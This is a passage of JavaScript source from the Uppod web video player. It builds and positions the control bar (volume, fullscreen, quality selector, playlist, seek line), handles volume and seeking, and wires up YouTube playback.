            volbarline_s = Cntrl_Style("volbarline"),
            r = createElement("div"),
            volbarline_b.appendChild(r),
            CSS(r, {
                cursor: "pointer",
                position: "absolute",
                left: 0,
                top: -10,
                width: volbarline_s.w,
                height: volbarline_s.h + 20,
                opacity: "0",
                filter: "alpha(opacity=0)"
            }),
            volbarline_all_b = createElement("div"),
            volbarline_b.appendChild(volbarline_all_b),
            CSS(volbarline_all_b, {
                cursor: "pointer",
                position: "absolute",
                left: 0,
                top: 0,
                width: volbarline_s.w,
                height: volbarline_s.h,
                borderRadius: volbarline_s.h / 2 * volbarline_s.o + "px",
                opacity: volbarline_s.all_a,
                filter: "alpha(opacity=" + 100 * volbarline_s.all_a + ")"
            }),
            CheckGradiendDiv(volbarline_all_b, volbarline_s.color_all),
            volbarline_s.active = !1,
            volbarline_play_b = createElement("div"),
            volbarline_b.appendChild(volbarline_play_b),
            CSS(volbarline_play_b, {
                "pointer-events": "none",
                position: "absolute",
                left: 0,
                top: 0,
                height: volbarline_s.h,
                borderRadius: volbarline_s.h / 2 * volbarline_s.o + "px",
                opacity: volbarline_s.play_a,
                filter: "alpha(opacity=" + 100 * volbarline_s.play_a + ")"
            }),
            volbarline_s.color_load && (volbarline_s.color_play = volbarline_s.color_load),
            CheckGradiendDiv(volbarline_play_b, volbarline_s.color_play),
            CSS(volbarline_b, {
                cursor: "pointer",
                position: "absolute",
                top: (vars.cntrloutheight - volbarline_s.h) / 2 + volbarline_s.margintop - volbarline_s.marginbottom
            }),
            cntrls[s] = volbarline_s.w + vars.cntrlmargin + 5,
            cntrlength += cntrls[s] + volbarline_s.marginleft + volbarline_s.marginright,
            CSS(volbarline_play_b, {
                width: volbarline_s.w * (v || vars.volume)
            }),
            volbarline_b.onmousedown = function(t) {
                volbarline_s.active = !0,
                VolumeMove(t = t || window.event)
            }
            ,
            volbarline_b.onmousemove = function(t) {
                VolumeMove(t = t || window.event)
            }
            ,
            volbarline_b.onmouseout = function(t) {
                VolumeOut(t = t || window.event)
            }
            ,
            volbarline_b.onmouseup = function(t) {}
            ,
            cntrli[s] = volbarline_b),
            "volbar" == cntrl[s] && !mobile) {
                for (volbar_b = createElement("div"),
                t.addDom("VolumeBar", volbar_b),
                controls.appendChild(volbar_b),
                volbars = [],
                vars.cntrl_volbar.all_a && (vars.cntrlvolbar.all_a = vars.cntrl_volbar.all_a),
                vars.cntrl_volbar.play_a && (vars.cntrlvolbar.play_a = vars.cntrl_volbar.play_a),
                vars.cntrl_volbar.icon && (1 == vars.cntrl_volbar.icon && (vars.cntrlvolbar.n = 10,
                vars.cntrlvolbar.bar = 1),
                2 == vars.cntrl_volbar.icon && (vars.cntrlvolbar.n = 5,
                vars.cntrlvolbar.bar = 0),
                3 == vars.cntrl_volbar.icon && (vars.cntrlvolbar.n = 10,
                vars.cntrlvolbar.bar = 0)),
                vars.cntrl_volbar.n && (vars.cntrlvolbar.n = vars.cntrl_volbar.n),
                vars.cntrl_volbar.bar && (vars.cntrlvolbar.bar = vars.cntrl_volbar.bar),
                vars.cntrl_volbar.scale && (vars.cntrlvolbar.scale = vars.cntrl_volbar.scale),
                vars.cntrl_volbar.margintop ? vars.cntrlvolbar.margintop = vars.cntrl_volbar.margintop : vars.cntrlvolbar.margintop = 0,
                vars.cntrl_volbar.marginbottom ? vars.cntrlvolbar.marginbottom = vars.cntrl_volbar.marginbottom : vars.cntrlvolbar.marginbottom = 0,
                vars.cntrlvolbar.w = 5 * vars.cntrlvolbar.n * vars.cntrlvolbar.scale,
                vars.cntrlvolbar.h = 10 * vars.cntrlvolbar.scale,
                vb = 0; vb < vars.cntrlvolbar.n; vb++) {
                    var l = 1 == vars.cntrlvolbar.bar ? 10 / vars.cntrlvolbar.n * (vb + 1) : 10 * vars.cntrlvolbar.scale;
                    volbars[vb] = new Element("volbar",3 * vars.cntrlvolbar.scale,l),
                    volbar_b.appendChild(volbars[vb].c),
                    CSS(volbars[vb].c, {
                        position: "absolute",
                        top: 10 * vars.cntrlvolbar.scale - l * vars.cntrlvolbar.scale,
                        left: 5 * vb * vars.cntrlvolbar.scale + 10 * (vars.cntrlvolbar.scale - 1),
                        opacity: vars.cntrlvolbar.all_a
                    }),
                    1 == vars.cntrl_volbar.bar && (volbars[vb].c.onmouseover = function(t) {
                        CSS(this, {
                            top: l - 1
                        })
                    }
                    ,
                    volbars[vb].c.onmouseout = function(t) {
                        CSS(this, {
                            top: l
                        })
                    }
                    )
                }
                volbar_b.onmousedown = function(t) {
                    volbar_b.active = !0,
                    VolbarMove(t = t || window.event)
                }
                ,
                volbar_b.onmousemove = function(t) {
                    VolbarMove(t = t || window.event)
                }
                ,
                volbar_b.onmouseup = function(t) {
                    volbar_b.active = !1
                }
                ,
                CSS(volbar_b, {
                    cursor: "pointer",
                    position: "absolute",
                    top: (vars.cntrloutheight - vars.cntrlvolbar.h) / 2 + (vars.cntrlvolbar.h - 10) * vars.cntrlvolbar.scale + vars.cntrlvolbar.margintop - vars.cntrlvolbar.marginbottom,
                    width: vars.cntrlvolbar.w,
                    height: vars.cntrlvolbar.h
                }),
                cntrls[s] = 5 * (vars.cntrlvolbar.n + 1) + vars.cntrlmargin,
                cntrlength += cntrls[s] + (vars.cntrlvolbar.marginleft || 0) + (vars.cntrlvolbar.marginright || 0),
                cntrli[s] = volbar_b,
                0 != v && VolumeDraw(-v)
            }
            if ("full" == cntrl[s] && (t.add(new Uppod.EnterFullscreenControl(uppod)),
            t.add(new Uppod.ExitFullscreenControl(uppod)),
            full_b = uppod.controls().EnterFullscreen.options.element,
            full_back_b = uppod.controls().ExitFullscreen.options.element,
            cntrls[s] = full_b.w + vars.cntrlmargin,
            cntrlength += cntrls[s] + full_b.s.marginleft + full_b.s.marginright,
            cntrli[s] = full_b,
            1 == vars.tip && 0 == full_b.s.notip && (full_b.c.onmouseover = function() {
                ToolTip(full_b.c, full_b.s.tip || vars.lang2.full)
            }
            ,
            full_b.c.onmouseout = function() {
                ToolTipHide(full_b.c)
            }
            ,
            full_back_b.c.onmouseover = function() {
                ToolTip(full_back_b.c, full_back_b.s.tip || vars.lang2.full_back)
            }
            ,
            full_back_b.c.onmouseout = function() {
                ToolTipHide(full_back_b.c)
            }
            )),
            "sub" == cntrl[s] && (sub_b = new Element("sub",20,20),
            t.addElement("Sub", sub_b),
            controls.appendChild(sub_b.c),
            CSS(sub_b.c, {
                cursor: "pointer",
                position: "absolute",
                top: (vars.cntrloutheight - sub_b.h) / 2 + sub_b.s.margintop - sub_b.s.marginbottom
            }),
            sub_b.c.onclick = SetSub,
            cntrls[s] = sub_b.w + vars.cntrlmargin,
            cntrlength += cntrls[s] + sub_b.s.marginleft + sub_b.s.marginright,
            cntrli[s] = sub_b,
            1 == vars.tip && 0 == sub_b.s.notip && (sub_b.c.onmouseover = function() {
                ToolTip(sub_b.c, sub_b.s.tip || vars.lang2.sub)
            }
            ,
            sub_b.c.onmouseout = function() {
                ToolTipHide(sub_b.c)
            }
            ),
            0 == vars.substart && CSS(sub_b.c, {
                opacity: sub_b.s.alpha0
            })),
            "hd" == cntrl[s] && (vars.youtube && (vars.hdlinks = "hd720,large,medium,small,auto",
            vars.hd = "720p,480p,320p,240p,auto",
            60 == vars.hdsw && (vars.hdsw = 55),
            vars.filehd = ""),
            vars.hd || "" != vars.filehd)) {
                var r = !1;
                if (vars.hd ? -1 < vars.hd.indexOf("::") && (r = !0) : "" != vars.filehd && (r = !0),
                r)
                    hd_b = new Element("hd",20,20),
                    t.addElement("Hd", hd_b),
                    controls.appendChild(hd_b.c),
                    CSS(hd_b.c, {
                        cursor: "pointer",
                        display: 1 == vars.hd1 ? "none" : "block",
                        position: "absolute",
                        top: Math.floor((vars.cntrloutheight - hd_b.h) / 2 + hd_b.s.margintop - hd_b.s.marginbottom)
                    }),
                    hd_b.s.icon2 && hd_b.s.icon == hd_b.s.icon2 && CSS(hd_b.c, {
                        opacity: hd_b.s.alpha0
                    }),
                    cntrls[s] = hd_b.w + vars.cntrlmargin,
                    hd_b.c.onclick = Quality,
                    cntrlength += cntrls[s] + hd_b.s.marginleft + hd_b.s.marginright,
                    cntrli[s] = hd_b,
                    1 == vars.tip && 0 == hd_b.s.notip && (hd_b.c.onmouseover = function() {
                        ToolTip(hd_b.c, hd_b.s.tip || vars.lang2.hd)
                    }
                    ,
                    hd_b.c.onmouseout = function() {
                        ToolTipHide(hd_b.c)
                    }
                    ),
                    hd1_b = new Element("hd1",20,20,"","hd"),
                    t.addElement("Hd1", hd1_b),
                    controls.appendChild(hd1_b.c),
                    CSS(hd1_b.c, {
                        cursor: "pointer",
                        display: 1 == vars.hd1 ? "block" : "none",
                        position: "absolute",
                        top: Math.floor((vars.cntrloutheight - hd1_b.h) / 2 + hd1_b.s.margintop - hd1_b.s.marginbottom)
                    }),
                    hd1_b.c.onclick = Quality,
                    1 == vars.tip && 0 == hd1_b.s.notip && (hd1_b.c.onmouseover = function() {
                        ToolTip(hd1_b.c, hd_b.s.tip_off || vars.lang2.hd)
                    }
                    ,
                    hd1_b.c.onmouseout = function() {
                        ToolTipHide(hd1_b.c)
                    }
                    );
                else if (-1 < vars.hd.indexOf(",")) {
                    if (vars.hda = vars.hd.split(","),
                    60 == vars.hdsw && 0 == vars.hlsautoquality) {
                        for (var a = vars.hdsw = 0; a < vars.hda.length; a++)
                            vars.hdsw < measureText(vars.hda[a], 12).width && (vars.hdsw = measureText(vars.hda[a], 12).width);
                        vars.hdsw += 22
                    }
                    hd_b = new Element("hdselect",vars.hdsw,20,"","hd"),
                    t.addElement("HdSelect", hd_b),
                    controls.appendChild(hd_b.c),
                    CSS(hd_b.c, {
                        cursor: "pointer",
                        position: "absolute",
                        top: Math.floor((vars.cntrloutheight - hd_b.h) / 2 + hd_b.s.margintop - hd_b.s.marginbottom)
                    }),
                    cntrls[s] = hd_b.w + vars.cntrlmargin,
                    cntrlength += cntrls[s] + hd_b.s.marginleft + hd_b.s.marginright,
                    cntrli[s] = hd_b,
                    1 == vars.tip && 0 == hd_b.s.notip && (hd_b.c.title = hd_b.s.tip || vars.lang2.hd),
                    hdselect = document.createElement("select"),
                    hd_b.c.appendChild(hdselect),
                    HdSelect(),
                    CSS(hdselect, {
                        position: "absolute",
                        margin: "1px 0px 0px -5px",
                        opacity: 0,
                        cursor: "pointer",
                        width: vars.hdsw
                    }),
                    hdselect.onchange = QualitySelecter
                }
            }
            "playlist" == cntrl[s] && "" != vars.pl && (playlist_b = new Element("playlist",20,20),
            t.addElement("Playlist", playlist_b),
            controls.appendChild(playlist_b.c),
            CSS(playlist_b.c, {
                cursor: "pointer",
                position: "absolute",
                top: (vars.cntrloutheight - playlist_b.h) / 2 + playlist_b.s.margintop - playlist_b.s.marginbottom
            }),
            playlist_b.c.onclick = Pl,
            cntrls[s] = playlist_b.w + vars.cntrlmargin,
            cntrlength += cntrls[s] + playlist_b.s.marginleft + playlist_b.s.marginright,
            cntrli[s] = playlist_b,
            1 == vars.tip && 0 == playlist_b.s.notip && (playlist_b.c.onmouseover = function() {
                ToolTip(playlist_b.c, playlist_b.s.tip || vars.lang2.list)
            }
            ,
            playlist_b.c.onmouseout = function() {
                ToolTipHide(playlist_b.c)
            }
            )),
            "menu" == cntrl[s] && (menu_b = new Element("menu",20,20),
            t.addElement("Menu", menu_b),
            controls.appendChild(menu_b.c),
            CSS(menu_b.c, {
                cursor: "pointer",
                position: "absolute",
                top: (vars.cntrloutheight - menu_b.h) / 2 + menu_b.s.margintop - menu_b.s.marginbottom
            }),
            menu_b.c.onclick = Menu,
            cntrls[s] = menu_b.w + vars.cntrlmargin,
            cntrlength += cntrls[s] + menu_b.s.marginleft + menu_b.s.marginright,
            cntrli[s] = menu_b,
            1 == vars.tip && 0 == menu_b.s.notip && (menu_b.c.onmouseover = function() {
                ToolTip(menu_b.c, menu_b.s.tip || vars.lang2.menu)
            }
            ,
            menu_b.c.onmouseout = function() {
                ToolTipHide(menu_b.c)
            }
            )),
            "buffer" == cntrl[s] && line_b && (buffer_b = new Element("buffer",30,14),
            t.addElement("Buffer", buffer_b),
            controls.appendChild(buffer_b.c),
            CSS(buffer_b.c, {
                cursor: "default",
                position: "absolute",
                "white-space": "nowrap"
            }),
            cntrli[s] = buffer_b,
            cntrls[s] = 0,
            buffer_b.c.innerHTML = vars.lang2.loading),
            "start" == cntrl[s] && (start_b = new Element("start",20,20),
            t.addElement("Start", start_b),
            body.c.appendChild(start_b.c),
            CSS(start_b.c, {
                cursor: "pointer",
                position: "absolute",
                top: vars.ph / 2 - start_b.h / 2,
                left: vars.sw / 2 - start_b.w / 2,
                zIndex: 7
            }),
            start_b.c.onclick = Toggle,
            start_b.c.style.zIndex = 7),
            "space" == cntrl[s] && (space_b = createElement("div"),
            t.addDom("Space", space_b),
            controls.appendChild(space_b),
            CSS(space_b, {
                position: "absolute",
                top: (vars.cntrloutheight - 20) / 2
            }),
            cntrli[s] = space_b),
            "line" == cntrl[s] && (iline = !0,
            line_b = createElement("div"),
            t.addDom("Line", line_b),
            controls.appendChild(line_b),
            line_s = Cntrl_Style("line"),
            line_all_b = createElement("div"),
            line_b.appendChild(line_all_b),
            CSS(line_all_b, {
                position: "absolute",
                left: 0,
                top: 0,
                width: "100%",
                height: line_s.h,
                borderRadius: line_s.h / 2 * line_s.o + "px",
                opacity: line_s.all_a,
                filter: "alpha(opacity=" + 100 * line_s.all_a + ")"
            }),
            CheckGradiendDiv(line_all_b, line_s.color_all),
            line_load_b = createElement("div"),
            line_b.appendChild(line_load_b),
            CSS(line_load_b, {
                position: "absolute",
                left: 0,
                top: 0,
                width: "100%",
                height: line_s.h,
                backgroundColor: "#" + ReColor(line_s.color_load),
                borderRadius: line_s.h / 2 * line_s.o + "px",
                opacity: line_s.load_a,
                filter: "alpha(opacity=" + 100 * line_s.load_a + ")"
            }),
            CheckGradiendDiv(line_load_b, line_s.color_load),
            line_play_b = createElement("div"),
            line_b.appendChild(line_play_b),
            CSS(line_play_b, {
                position: "absolute",
                left: 0,
                top: 0,
                width: "100%",
                height: line_s.h,
                backgroundColor: "#" + ReColor(line_s.color_play),
                borderRadius: line_s.h / 2 * line_s.o + "px",
                opacity: line_s.play_a,
                filter: "alpha(opacity=" + 100 * line_s.play_a + ")"
            }),
            CheckGradiendDiv(line_play_b, line_s.color_play),
            CSS(line_b, {
                position: "absolute",
                top: (vars.cntrloutheight - line_s.h) / 2 + +line_s.margintop - +line_s.marginbottom,
                cursor: "pointer"
            }),
            CSS(line_play_b, {
                width: "0"
            }),
            CSS(line_load_b, {
                width: "0"
            }),
            line_s.active = !1,
            line_but_b = createElement("div"),
            t.addDom("LineBtn", line_but_b),
            controls.appendChild(line_but_b),
            CSS(line_but_b, {
                position: "absolute",
                height: line_s.h < 10 ? 20 : 2 * line_s.h,
                cursor: "pointer"
            }),
            line_but_b.onmousedown = function(t) {
                Uppod.trace("line_but_b.onmousedown"),
                istart || Toggle(),
                line_s.active = !0,
                t = t || window.event
            }
            ,
            line_but_b.onmouseup = function(t) {
                Uppod.trace("line_but_b.onmouseup"),
                istart && (SeekMove(t),
                line_s.active = !1)
            }
            ,
            1 == vars.tip && 0 == line_s.notip && (line_but_b.onmouseover = function() {
                ToolTip(line_but_b, "line")
            }
            ,
            line_but_b.onmouseout = function() {
                ToolTipHide(line_but_b)
            }
            ),
            cntrli[s] = line_b)
        }
        time_all_b && 0 < vars.time && (time_all_b.c.innerHTML = formatTime(vars.time)),
        PlaceControls()
    }
    function CntrlBg() {
        uibg && Remove("uibg"),
        1 != vars.cntrlout && 1 == vars.cntrlbg && (-1 == vars.cntrlbgcolor.indexOf("|") && (vars.cntrlbgcolor = vars.cntrlbgcolor + "|" + vars.cntrlbgcolor),
        uibg = new Shaper2({
            w: vars.scrn_w - 2 * vars.cntrlbgmargin - vars.cntrlbgmarginleft - vars.cntrlbgmarginright,
            h: vars.cntrloutheight,
            onotop: vars.cntrloutheight == vars.h ? 0 : 1,
            bgc: vars.cntrlbgcolor,
            bga1: vars.cntrlbgalpha1,
            bga2: vars.cntrlbgalpha2,
            o: 0 < vars.padding ? vars.o / 2 : vars.cntrlbgo
        })),
        1 == vars.cntrlout && 0 == vars.padding && (-1 == vars.cntrlbgcolor.indexOf("|") && (vars.cntrlbgcolor = vars.cntrlbgcolor + "|" + vars.cntrlbgcolor),
        uibg = new Shaper2({
            w: vars.scrn_w,
            h: vars.cntrloutheight,
            o: vars.o / 2 - vars.padding,
            onotop: vars.cntrloutheight == vars.h ? 0 : 1,
            bgc: vars.bodycolor,
            bga1: 1,
            bga2: 1,
            o: 0 < vars.padding ? vars.o / 2 : vars.cntrlbgo
        })),
        uibg && (uibg.c.setAttribute("id", "uibg"),
        controls.appendChild(uibg.c),
        CSS(uibg.canvas, {
            position: "absolute",
            top: 0,
            left: vars.cntrlbgmarginleft + "px"
        }),
        1 == vars.glass && (uibg_gl = new Shaper2({
            w: vars.scrn_w,
            h: vars.cntrloutheight / 2,
            o: vars.o / 2 - vars.padding,
            bgc: -1 == vars.glasscolor.indexOf("|") ? vars.glasscolor + "|" + vars.glasscolor : vars.glasscolor,
            bga1: vars.glassalpha1,
            bga2: vars.glassalpha2
        }),
        uibg.c.appendChild(uibg_gl.c),
        CSS(uibg_gl.canvas, {
            position: "absolute",
            top: 0,
            left: 0,
            height: vars.cntrloutheight / 2,
            width: vars.scrn_w
        })))
    }
    function PlaceControls() {
        var t, e, o = vars.sw - cntrlength - 2 * vars.cntrlendmargin - 2 * vars.cntrlmargin - (ifull ? 0 : 2 * vars.padding) - vars.cntrlmarginleft - vars.cntrlmarginright - 4 * (timelength - 4) * timeitems, s = vars.cntrlendmargin + vars.cntrlmarginleft;
        for (i = 0; i < cntrl.length; i++)
            cntrli[i] && (e = t = 0,
            cntrli[i].s && (t = parseInt(cntrli[i].s.marginleft),
            e = parseInt(cntrli[i].s.marginright)),
            "volbarline" == cntrl[i] && (t = vars.cntrl_volbarline.marginleft || 0,
            e = vars.cntrl_volbarline.marginright || 0),
            s += t,
            cntrli[i] != line_b && cntrli[i] != space_b ? (CSS(null != cntrli[i].c ? cntrli[i].c : cntrli[i], {
                left: s
            }),
            "play" != cntrl[i] && "playstop" != cntrl[i] || CSS(pause_b.c, {
                left: s
            }),
            "full" == cntrl[i] && CSS(full_back_b.c, {
                left: s
            }),
            "hd" == cntrl[i] && hd1_b && CSS(hd1_b.c, {
                left: s
            }),
            "volume" != cntrl[i] && "volbarline_v" != cntrl[i] || CSS(volume_mute_b.c, {
                left: s,
                opacity: 2 == volume_mute_b.s.icon ? .5 : 1
            }),
            "volbarline_v" == cntrl[i] && CSS(volbarline_b, {
                left: s + volume_b.w / 2 - volbarline_s.w / 2
            }),
            -1 < cntrl[i].indexOf("time") && (s += 4 * (timelength - 4) + (vars.cntrlmargin - 5)),
            s += Math.floor(cntrls[i] + e)) : (cntrli[i] == line_b && (1 == vars.cntrl_line.full ? (CSS(line_b, {
                left: vars.cntrl_line.marginleft || 0,
                top: vars.cntrloutheight / 2 + line_all_b.h - (vars.cntrl_line.marginbottom || 0) + (vars.cntrl_line.margintop || 0)
            }),
            line_all_b.w = vars.sw - (vars.cntrl_line.marginleft || 0) - (vars.cntrl_line.marginright || 0),
            line_play_b.w = line_all_b.w,
            line_load_b.w = line_all_b.w,
            CSS(line_all_b, {
                width: line_all_b.w + "px"
            })) : (CSS(line_b, {
                left: s + 3 + (vars.cntrl_line.marginleft || 0)
            }),
            line_all_b.w = o,
            line_play_b.w = o,
            line_load_b.w = o,
            CSS(line_all_b, {
                width: o + "px"
            }),
            cntrls[i] = o,
            s += Math.floor(cntrls[i] + vars.cntrlmargin + 6 + (vars.cntrl_line.marginright || 0) + (vars.cntrl_line.marginleft || 0))),
            CSS(line_but_b, {
                width: line_all_b.w + "px",
                position: "absolute",
                top: parseInt(line_b.style.top) + line_s.h / 2 - parseInt(line_but_b.style.height) / 2,
                left: line_b.style.left,
                cursor: "pointer"
            })),
            cntrli[i] == space_b && (CSS(space_b, {
                left: s + 3,
                width: o + "px"
            }),
            cntrls[i] = o,
            s += Math.floor(cntrls[i] + vars.cntrlmargin + 6))),
            buffer_b && (CSS(buffer_b.c, {
                left: line_b.offsetLeft
            }),
            CSS(buffer_b.c, {
                top: line_b.offsetTop - 10
            })));
        line_b && run_b && RunPos(run_b, line_b, line_play_b, line_all_b, run_pos),
        volbarline_b && runvolume_b && RunPos(runvolume_b, volbarline_b, volbarline_play_b, volbarline_all_b, runvolume_pos)
    }
    function RunPos(t, e, i, o, s) {
        var l;
        t == runvolume_b && vars.ivolbar_v ? ((l = -i.offsetHeight - (0 < s ? t.offsetHeight : t.offsetHeight / 2)) < e.offsetTop && (l = e.offsetTop),
        l > 0 + t.offsetHeight && (l = t.offsetHeight),
        CSS(t, {
            top: l + "px",
            left: e.offsetLeft + o.offsetWidth / 2 - t.offsetWidth / 2 - ("1" == s ? t.offsetWidth / 2 + o.offsetWidth / 2 : 0) + ("2" == s ? t.offsetWidth / 2 + o.offsetWidth / 2 : 0) + "px"
        })) : ((l = i.offsetWidth + e.offsetLeft - (0 < s ? t.offsetWidth : t.offsetWidth / 2)) < e.offsetLeft && (l = e.offsetLeft),
        l > e.offsetLeft + o.offsetWidth - t.offsetWidth && (l = e.offsetLeft + o.offsetWidth - t.offsetWidth),
        CSS(t, {
            left: l + "px",
            top: Math.floor(o.offsetTop + e.offsetTop + o.offsetHeight / 2 - t.offsetHeight / 2 - ("1" == s ? t.offsetHeight / 2 + o.offsetHeight / 2 : 0) + ("2" == s ? t.offsetHeight / 2 + o.offsetHeight / 2 : 0) + (vars.cntrl_run.margintop ? +vars.cntrl_run.margintop : "") - (vars.cntrl_run.marginbottom ? +vars.cntrl_run.marginbottom : "")) + "px"
        }))
    }
    function Cntrl_Style(t) {
        var e, i = [];
        for (e in vars.cntrlstyle)
            i[e] = vars.cntrlstyle[e];
        for (e in vars["cntrl" + t])
            i[e] = vars["cntrl" + t][e];
        for (e in vars["cntrl_" + t])
            i[e] = vars["cntrl_" + t][e];
        return i
    }
    function findLeft(t) {
        var e = 0;
        if (t.offsetParent)
            for (e = t.offsetLeft; t = t.offsetParent; )
                e += t.offsetLeft;
        var i = 0;
        return "relative" == window.getComputedStyle(document.body, null).position && (i = document.body.getBoundingClientRect().left),
        e + i
    }
    function findTop(t) {
        var e = 0;
        if (t.offsetParent)
            for (e = t.offsetTop; t = t.offsetParent; )
                e += t.offsetTop;
        return e
    }
    function VolumeButOver() {
        CSS(volbarline_b, {
            display: "block"
        }),
        runvolume_b && (CSS(runvolume_b, {
            display: "block"
        }),
        runvolume_b.style.zIndex = 8,
        RunPos(runvolume_b, volbarline_b, volbarline_play_b, volbarline_all_b, runvolume_pos)),
        volbarline_s.over = !0
    }
    function VolbarHide() {
        volbarline_s.over = !1,
        setTimeout(VolbarHideProcess, 1e3)
    }
    function VolbarHideProcess() {
        volbarline_s.over ? setTimeout(VolbarHideProcess, 1e3) : (CSS(volbarline_b, {
            display: "none"
        }),
        runvolume_b && CSS(runvolume_b, {
            display: "none"
        }))
    }
    function VolumeMove(t) {
        volbarline_s.active && Volume((t = t || window.event).offsetX)
    }
    function VolumeOut(t) {
        volbarline_s.active && (t = t || window.event).offsetX >= volbarline_s.w && (volbarline_s.active = !1)
    }
    function VolumeMove_v(t) {
        volbarline_s.active && vars.ivolbar_v && (t = (t = t || window.event).offsetY,
        Volume(volbarline_s.h - t))
    }
    function VolbarMove(t) {
        volbar_b.active && Volume((t = t || window.event).pageX - findLeft(volbar_b))
    }
    function Volume(t) {
        t = VolumeDraw(t);
        VolumeN(t),
        1 == vars.remvolume && (uppod_storage_support ? localStorage.setItem("pljsvolume", t) : setCookie("pljsvolume", t, 365))
    }
    function VolumeDraw(t) {
        if (volbarline_play_b && (vars.ivolbar_v ? (v = 0 < t ? Math.max(0, Math.min(1, t / volbarline_s.h)) : -t,
        CSS(volbarline_play_b, {
            height: volbarline_s.h * v + "px",
            top: volbarline_s.h - volbarline_s.h * v
        })) : (v = 0 < t ? Math.max(0, Math.min(1, t / volbarline_s.w)) : -t,
        CSS(volbarline_play_b, {
            width: volbarline_s.w * v + "px"
        }))),
        volbar_b)
            for (vb = 0; vb < volbars.length; vb++)
                v = 0 < t ? Math.max(0, Math.min(1, t / vars.cntrlvolbar.w)) : -t,
                vb < Math.ceil(volbars.length * v) ? CSS(volbars[vb].c, {
                    opacity: vars.cntrlvolbar.play_a
                }) : CSS(volbars[vb].c, {
                    opacity: vars.cntrlvolbar.all_a
                });
        return volbarline_b && runvolume_b && RunPos(runvolume_b, volbarline_b, volbarline_play_b, volbarline_all_b, runvolume_pos),
        v
    }
    function VolumeN(t) {
        muted && 0 < t && (Mute(),
        isYoutube() && media_yt.unMute()),
        muted = !(0 < t),
        isYoutube() ? media_yt.setVolume(100 * t) : (media.volume = t,
        media && (media.muted = !1)),
        MuteControl()
    }
    function SeekMove(t) {
        var e = t.offsetX;
        Uppod.trace("SeekMove clickX = " + e),
        line_s.active && (t = t || window.event,
        Seek(e))
    }
    function Seek(t) {
        Uppod.trace("Seek cursorX = " + t),
        t = iline ? Math.max(0, Math.min(1, t / line_all_b.w)) : 0,
        isYoutube() ? media_yt.seekTo(t * media_yt.getDuration()) : media && media.duration && SeekTime(t * media.duration),
        StopSub()
    }
    function SeekTime(t) {
        Uppod.trace("SeekTime to " + t),
        media && media.duration && t && (media.currentTime = t),
        isYoutube() && media_yt.seekTo(t)
    }
    function IconImg() {
        return Uppod.IconImg.apply(this, arguments)
    }
    function CheckBase64() {
        return Uppod.CheckBase64.apply(this, arguments)
    }
    function CSS() {
        return Uppod.setStyle.apply(this, arguments)
    }
    function destroyCanvases() {
        for (var t = 0; t < canvasObjs.length; t++) {
            var e = canvasObjs[t];
            e && (e.canvas = null)
        }
    }
    function YoutubeInit() {
        vars.youtube && vars.youtube_id && (youtubeElemId = "yt_media_" + vars.uid,
        (media = createElement("div")).setAttribute("id", youtubeElemId),
        media_mc.appendChild(media),
        media_yt = new uppod.window.YT.Player(youtubeElemId,{
            height: vars.scrn_h,
            width: vars.scrn_w,
            videoId: vars.youtube_id,
            playerVars: {
                enablejsapi: 1,
                html5: 1,
                iv_load_policy: 3,
                playerapiid: youtubeElemId,
                disablekb: 1,
                controls: browser.restrictMediaPlay ? 1 : 0,
                showinfo: 0,
                modestbranding: 1,
                rel: 0,
                autoplay: 0,
                loop: 0
            },
            events: {
                onReady: YoutubePlayerReady,
                onError: YoutubeError,
                onPlaybackQualityChange: YoutubeQualityChanged,
                onStateChange: YoutubePlayerStateChange
            }
        }),
        layer && "" == vars.poster && Hide(layer))
    }
    function isYoutubeApiLoaded() {
        return !!uppod.window.YT
    }
    function isYoutube() {
        return !(!vars.youtube || !media_yt)
    }
    function YoutubePlayerReady() {
        onReady(),
        checkStart(),
        youtubeIframe = uppod.document.querySelector("#" + youtubeElemId),
        "play" != vars.auto || mobile && 0 != vars.volume || (Play(),
        media_yt.playVideo())
    }
    function YoutubeError(t) {
        t && NotFound()
    }
    function YoutubeQualityChanged() {}
    function YoutubeQuality() {
        var t = media_yt.getAvailableQualityLevels();
        vars.hdlinks = t;
        for (var e = [], i = 0; i < t.length; i++)
            switch (t[i]) {
            case "tiny":
                e[i] = "144p";
                break;
            case "small":
                e[i] = "240p";
                break;
            case "medium":
                e[i] = "320p";
                break;
            case "large":
                e[i] = "480p";
                break;
            case "hd720":
                e[i] = "720p";
                break;
            case "hd1080":
                e[i] = "1080p";
                break;
            case "highres":
                e[i] = "High";
                break;
            default:
                e[i] = t[i]
            }
        vars.hda = e,
        HdSelect()
    }
    function YoutubePlayerStateChange() {
        var t = media_yt.getPlayerState();
        1 == t && !vars.youtube_quality_received && hd_b && (YoutubeQuality(),
        vars.youtube_quality_received = !0),
        t == uppod.window.YT.PlayerState.PLAYING && OnPlay(),
        t == uppod.window.YT.PlayerState.PAUSED && OnPause(),
        t == uppod.window.YT.PlayerState.ENDED && OnEnded()
    }
    function disableSelection(t) {
        void 0 !== t.onselectstart ? t.onselectstart = function() {
            return !1
        }
        : void 0 !== t.style.MozUserSelect ? t.style.MozUserSelect = "none" : (t.onmousedown = function() {
            return !1
        }
        ,
        t.style.cursor = "default")
    }
    function SelectRework(t, e) {
        e.ctx.clearRect(0, 0, 200, 200),
        e.ctx.fillText(t, 5 * e.s.scale, 15 * e.s.scale),
        tmp = "";
        for (var i = 0; i < vars.hdlinks.length; i++)
            tmp += vars.hdlinks[i];
        1 == e.s.marker && "," != tmp && "" != tmp && (e.ctx.beginPath(),
        e.ctx.moveTo(e.canvas.offsetWidth - 10 * e.s.scale, 9 * e.s.scale),
        e.ctx.lineTo(e.canvas.offsetWidth - 6 * e.s.scale, 9 * e.s.scale),
        e.ctx.lineTo(e.canvas.offsetWidth - 8 * e.s.scale, 14 * e.s.scale),
        e.ctx.lineTo(e.canvas.offsetWidth - 10 * e.s.scale, 9 * e.s.scale),
        e.ctx.closePath(),
        e.ctx.lineWidth = .1,
        e.ctx.stroke(),
        e.ctx.fill())
    }
    function Element(t, e, i, o, s) {
        var l = [vars].concat(Array.prototype.slice.call(arguments, 0));
        Uppod.Element.apply(this, l),
        canvasObjs.push(this)
    }
    function Shaper2(t) {
        Uppod.Shaper2.call(this, t),
        canvasObjs.push(this)
    }
    function setVarsDefaults() {
        this.uid,
        this.sid,
        this.auto = "firstframe",
        this.autofull = 0,
        this.alerts = 1,
        this.addcontrols = "",
        this.airplay = 1,
        this.bgcolor = "ffffff",
        this.bodycolor = "000000",
        this.brd = 0,
        this.brdcolor = "cccccc",
        this.buffersec = 5,
        this.cntrlbg = 1,
        this.cntrlbgcolor = "000000|000000",
        this.cntrlbgalpha1 = .15,
        this.cntrlbgalpha2 = .7,
